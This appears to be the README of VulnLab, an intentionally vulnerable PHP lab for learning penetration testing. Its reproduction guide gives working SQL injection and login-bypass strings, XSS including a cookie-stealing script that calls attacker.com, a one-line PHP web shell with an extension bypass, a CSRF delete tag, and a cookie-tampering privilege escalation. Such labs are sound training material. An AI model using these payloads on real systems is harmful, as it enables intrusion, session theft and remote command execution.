# VulnLab — PHP 渗透测试靶场

> 一个故意包含多种常见漏洞的 PHP Web 应用，用于渗透测试学习、漏洞复现与安全研究。

![PHP](https://img.shields.io/badge/PHP-7.4%2B-blue)
![MySQL](https://img.shields.io/badge/MySQL-5.7%2B-orange)
![License](https://img.shields.io/badge/License-MIT-green)
![用途](https://img.shields.io/badge/用途-仅限安全研究-red)

---

## 项目简介

VulnLab 模拟了一个包含用户系统和博客功能的典型 PHP 应用，覆盖 **OWASP Top 10** 中的主要漏洞类型。代码刻意采用不安全的写法，帮助学习者理解：

- 漏洞是如何在真实开发中产生的
- 每类漏洞的利用方式与危害
- 如何从攻击者视角审计 Web 代码

---

## 漏洞覆盖

| 漏洞类型 | OWASP 分类 | 涉及文件 |
|----------|-----------|---------|
| SQL 注入（联合查询 / 报错 / 盲注） | A03 Injection | `article.php` `search.php` `admin/users.php` |
| 存储型 XSS | A03 Injection | `comment.php` `article.php` |
| 反射型 XSS | A03 Injection | `search.php` `admin/users.php` `admin/articles.php` |
| 文件上传（黑名单绕过 / 图片马） | A04 Insecure Design | `upload.php` |
| 水平越权 | A01 Broken Access Control | `profile.php` |
| 垂直越权（未授权访问后台） | A01 Broken Access Control | `admin/*` |
| CSRF（跨站请求伪造） | A01 Broken Access Control | `admin/delete.php` `comment.php` |
| 不安全的反序列化 | A08 Software/Data Integrity | `profile.php` `login.php` |
| 敏感信息泄露（明文密码 / 报错回显） | A02 Cryptographic Failures | 全局 |
| 失效的身份认证（无频率限制） | A07 Auth Failures | `login.php` |

---

## 目录结构

```
VulnLab/
├── conf/
│   └── db.php              # 数据库连接配置
├── install/
│   └── init.sql            # 数据库初始化脚本
├── admin/
│   ├── index.php           # 后台首页（垂直越权）
│   ├── users.php           # 用户管理（SQL注入 + 越权）
│   ├── articles.php        # 文章管理（SQL注入 + 越权）
│   ├── comments.php        # 评论管理（SQL注入 + 越权）
│   └── delete.php          # 删除处理器（CSRF + SQL注入）
├── uploads/                # 文件上传目录（需手动创建）
├── index.php               # 首页文章列表
├── login.php               # 登录（SQL注入 + 暴力破解）
├── register.php            # 注册（SQL注入 + 明文密码）
├── logout.php              # 退出登录
├── article.php             # 文章详情（SQL注入 + 存储型XSS）
├── comment.php             # 评论提交（存储型XSS + CSRF）
├── search.php              # 搜索（SQL注入 + 反射型XSS）
├── profile.php             # 用户中心（水平越权 + 反序列化）
└── upload.php              # 文件上传（黑名单绕过）
```

---

## 快速开始

### 环境要求

| 组件 | 版本要求 |
|------|---------|
| PHP | 7.3 或以上 |
| MySQL / MariaDB | 5.7 / 10.3 或以上 |
| Web 服务器 | Apache / Nginx / phpstudy |

### 部署步骤

**1. 克隆项目**

```bash
git clone https://github.com/your-username/vulnlab.git
cd vulnlab
```

**2. 初始化数据库**

```bash
mysql -u root -p < install/init.sql
```

或在 phpMyAdmin 中直接执行 `install/init.sql`。

**3. 修改数据库配置**

编辑 `conf/db.php`，根据本地环境修改连接信息：

```php
const DB_HOST = '127.0.0.1';
const DB_PORT = 3306;
const DB_NAME = 'sqltest';
const DB_USER = 'root';
const DB_PASS = '123456';
```

**5. 启动 Web 服务器**

将项目目录配置为 Web 根目录后，浏览器访问：

```
http://localhost/vulnlab/
```

---

## 内置账号

| 用户名 | 密码 | 角色 |
|--------|------|------|
| `admin` | `admin123` | 管理员 |
| `alice` | `alice123` | 普通用户 |
| `bob` | `bob123` | 普通用户 |
| `charlie` | `charlie123` | 普通用户 |

---

## 漏洞复现指南

### 1. SQL 注入

**联合查询注入**（`article.php`）

```
/article.php?id=1 UNION SELECT 1,username,password,email,5 FROM users--
```

**报错注入**（`article.php`）

```
/article.php?id=1 AND extractvalue(1,concat(0x7e,database()))
```

**盲注**（`profile.php`）

```
/profile.php?id=1 AND sleep(5)
```

**登录绕过**（`login.php`）

```
用户名填：' OR '1'='1'--
密码填：任意
```

---

### 2. XSS

**反射型**（`search.php`）

```
/search.php?q=<script>alert(document.cookie)</script>
```

**存储型**（评论区）

在任意文章评论框输入：

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

所有访问该文章的用户均会触发。

---

### 3. 文件上传绕过

将以下内容保存为 `shell.php5`（绕过 `.php` 黑名单）：

```php
<?php system($_GET['cmd']); ?>
```

上传后访问：

```
/uploads/shell.php5?cmd=whoami
```

**图片马**：在正常图片末尾追加 PHP 代码后上传，配合文件包含漏洞触发。

---

### 4. 越权

**水平越权**：登录 `alice` 后访问

```
/profile.php?id=1
```

即可查看并修改 `admin` 的邮箱和密码。

**垂直越权**：任意登录态用户直接访问

```
/admin/index.php
```

后台无 `role` 校验，普通用户可完全操控。

---

### 5. CSRF

构造如下页面，诱导已登录的管理员访问，即可静默删除用户：

```html
<img src="http://target/admin/delete.php?type=user&id=2">
```

---

### 6. 不安全的反序列化

登录后，浏览器 Cookie 中存有 `user_info` 字段，内容为 PHP 序列化字符串：

```
a:3:{s:2:"id";i:2;s:8:"username";s:5:"alice";s:4:"role";i:0;}
```

将 `role` 改为 `1` 后重新编码写入 Cookie，即可伪造管理员身份：

```
a:3:{s:2:"id";i:2;s:8:"username";s:5:"alice";s:4:"role";i:1;}
```

---

## 推荐配合工具

| 工具 | 用途 |
|------|------|
| [Burp Suite](https://portswigger.net/burp) | 抓包、改包、Repeater 重放 |
| [sqlmap](https://sqlmap.org/) | 自动化 SQL 注入检测 |
| [XSStrike](https://github.com/s0md3v/XSStrike) | XSS 检测 |
| [Postman](https://www.postman.com/) | 接口调试 |

---

## 参考资料

- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PHP 安全编程指南](https://phpsecurity.readthedocs.io/)

---

## License

MIT License — 仅供学习研究，禁止用于非法用途。
